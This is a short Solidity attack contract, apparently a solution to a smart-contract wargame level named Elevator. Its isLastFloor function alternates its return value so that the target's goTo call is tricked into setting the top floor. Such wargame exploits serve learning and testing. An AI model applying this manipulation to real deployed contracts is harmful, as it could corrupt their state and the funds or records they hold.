// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './Elevator.sol';

contract ElevantorAttack {
    bool public toogle = true;
    Elevator public victim;

    constructor (address _targetAddress){
        victim=Elevator(_targetAddress);
    }

    function isLastFloor(uint)public returns (bool){
        toogle=!toogle;
        return toogle;
    }

    function attack(uint _floor)public {
        victim.goTo(_floor);
    }


}
